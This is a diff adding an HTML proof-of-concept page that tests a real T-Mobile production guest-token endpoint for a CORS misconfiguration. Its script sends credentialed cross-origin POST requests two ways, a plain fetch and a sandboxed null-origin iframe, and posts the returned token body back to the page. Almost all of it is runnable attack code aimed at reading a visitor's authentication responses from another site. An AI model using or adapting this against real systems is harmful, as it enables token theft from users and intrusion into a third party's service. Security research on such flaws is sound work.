@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>T-Mobile Advanced Regex Test</title>
+    <style>
+        body { font-family: sans-serif; padding: 40px; background: #f4f4f4; text-align: center; }
+        .container { max-width: 700px; margin: auto; background: white; padding: 30px; border: 2px solid #e20074; border-radius: 10px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }
+        h1 { color: #e20074; }
+        button { background: #e20074; color: white; padding: 15px; width: 100%; border: none; cursor: pointer; font-weight: bold; margin-bottom: 10px; border-radius: 5px; }
+        button:hover { background: #b1005b; }
+        #output { margin-top: 20px; background: #222; color: #4af626; padding: 15px; min-height: 150px; text-align: left; white-space: pre-wrap; font-family: monospace; border-radius: 5px; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h1>CORS Filter Test</h1>
+    <p>Testing if the server allows subdomains or path-based origins.</p>
+    
+    <button onclick="runTest('standard')">TEST 1: Standard Fetch</button>
+    <button onclick="runTest('null')">TEST 2: Null Origin (Sandbox)</button>
+    
+    <pre id="output">Results will appear here...</pre>
+</div>
+
+<iframe id="sandbox" sandbox="allow-scripts" style="display:none;"></iframe>
+
+<script>
+    function runTest(type) {
+        var output = document.getElementById('output');
+        var target = 'https://adn.t-mobile.com/guest-auth/prd01/guest/v1/tokens?v=' + Date.now();
+        output.innerText = "Running " + type + " test...";
+
+        if (type === 'standard') {
+            fetch(target, {
+                method: 'POST',
+                mode: 'cors',
+                credentials: 'include',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({})
+            })
+            .then(r => {
+                var acao = r.headers.get('Access-Control-Allow-Origin');
+                return r.text().then(t => {
+                    output.innerText = "Status: " + r.status + "\nACAO: " + (acao || "None") + "\nBody: " + t;
+                });
+            })
+            .catch(e => {
+                output.innerText = "Error (Standard): " + e.message + "\n\n(Likely 403 OPTIONS block)";
+            });
+        } 
+        
+        if (type === 'null') {
+            var frame = document.getElementById('sandbox');
+            var code = `
+                <script>
+                    fetch('${target}', {
+                        method: 'POST',
+                        mode: 'cors',
+                        credentials: 'include',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({})
+                    })
+                    .then(r => r.text().then(t => window.parent.postMessage({s: r.status, b: t, a: r.headers.get('Access-Control-Allow-Origin')}, '*')))
+                    .catch(e => window.parent.postMessage({err: e.message}, '*'));
+                <\/script>
+            `;
+            frame.srcdoc = code;
+        }
+    }
+
+    window.addEventListener('message', function(e) {
+        var output = document.getElementById('output');
+        if (e.data.err) {
+            output.innerText = "Error (Null Origin): " + e.data.err;
+        } else {
+            output.innerText = "SUCCESS (Null Origin)!\nStatus: " + e.data.s + "\nACAO: " + (e.data.a || "None") + "\nBody: " + e.data.b;
+        }
+    });
+</script>
+
+</body>
+</html>
